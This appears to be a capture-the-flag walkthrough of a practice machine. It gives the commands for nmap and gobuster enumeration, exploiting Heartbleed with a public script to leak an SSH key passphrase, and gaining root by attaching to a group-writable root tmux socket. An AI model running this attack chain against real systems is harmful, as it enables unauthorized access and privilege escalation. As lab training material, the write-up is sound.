1. Run a normal nmap scan

nmap -sC -sC -p- -A 10.10.10.79

we have got the output 

22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
Also port 80 and 443 open with Apache/2.2.22

no other useful information found

2. We decived to run nmap vulnerability scan

As the result the application is vulnerable to POODLE and Heartbleed attacks

3. We have used sslyze --heardbleed 10.10.10.79

and got the confirmation "VULNERABLE - Server is vulnerable to Heartbleed"

 
4. In gobuster we have found directories 

/index (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/decode (Status: 200)
/omg (Status: 200)

5. We have found /hype_key under /dev folder. It has contents in HEX

we convert those HEX to ASCII using online tools and resulted in

RSA PRIVATE KEY Certificate

6. Save the key in a file name hype.key
7. check "file hype.key" shows "PEM RSA private key"
8. chmod 600 hype.key ==> Make it usable key
9. Download python heartbleed.py exploit  ==> https://gist.github.com/eelsivart/10174134

in the exploit, modify the payload length to ff (max length)

run the exploit as ==> python heartbleed.py -n 100 10.10.10.79  
-n 100 represents no. of time in loop.

We get the result GVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== 
Base64 decode it => heartbleedbelievethehype

10. Now we got the SSH Key and password "heartbleedbelievethehype"

Lets login into the site using the command

ssh -i hype.key hype@10.10.10.79 

If hype key asks for passphrase, use "heartbleedbelievethehype"


10. Now we got the shell of hype@valentine, and we have to use LinEnum.sh for enumeration

We got the bash history there the command "tmux -S /.devs/dev_sess" was executed

11. Now we check the currently running process from LinEnum.sh output

here the root is able to run usr/bin/tmux -S /.devs/dev_sess

root       1037  0.0  0.1  26416  1124 ?        Ss   00:15   0:16 /usr/bin/tmux -S /.devs/dev_sess

12. check the permissions of /.devs/dev_sess using ==> ls -la /.devs/dev_sess

rw-rw---- 1 root hype 0 Jul 16 00:15 /.devs/dev_sess


We are member of hype group and have read-write access to /.devs/dev_sess which is used by tmux as root.

12. So now run => tmux -S /.devs/dev_sess

AND WE ARE ROOT
